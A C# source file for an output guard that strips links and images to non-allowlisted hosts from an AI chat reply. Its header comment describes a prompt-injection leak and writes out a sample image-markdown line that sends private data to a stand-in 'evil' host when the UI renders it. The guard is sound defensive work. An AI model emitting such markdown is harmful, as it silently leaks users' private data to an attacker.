using System.Text.RegularExpressions;

namespace Phase4.ProductionAi.Security;

// Output guard against the classic leak: the model is tricked into writing ![x](https://evil/?d=<private data>).
// The chat UI renders the image → the BROWSER calls evil.example with the data in the URL, no click needed.
// Fix: only links/images to allowlisted hosts survive; everything else is removed before the reply is sent.
public static partial class ExfiltrationGuard
{
    private static readonly string[] AllowedHosts = ["acme.test", "docs.acme.test"];

    public static (string Text, List<string> Removed) Clean(string reply)
    {
        var removed = new List<string>();
        reply = MarkdownImage().Replace(reply, m => Allowed(m.Groups[1].Value) ? m.Value : Drop(removed, m.Groups[1].Value, ""));
        reply = MarkdownLink().Replace(reply, m => Allowed(m.Groups[2].Value) ? m.Value : Drop(removed, m.Groups[2].Value, m.Groups[1].Value));
        reply = BareUrl().Replace(reply, m => Allowed(m.Value) ? m.Value : Drop(removed, m.Value, "[link removed]"));
        return (reply, removed);
    }

    private static string Drop(List<string> removed, string url, string replacement) { removed.Add(url); return replacement; }

    private static bool Allowed(string url) =>
        Uri.TryCreate(url, UriKind.Absolute, out var uri) && AllowedHosts.Any(h => uri.Host == h || uri.Host.EndsWith("." + h));

    [GeneratedRegex(@"!\[[^\]]*\]\(([^)\s]+)\)")] private static partial Regex MarkdownImage();
    [GeneratedRegex(@"\[([^\]]+)\]\(([^)\s]+)\)")] private static partial Regex MarkdownLink();
    [GeneratedRegex(@"https?://[^\s)\]]+")] private static partial Regex BareUrl();
}
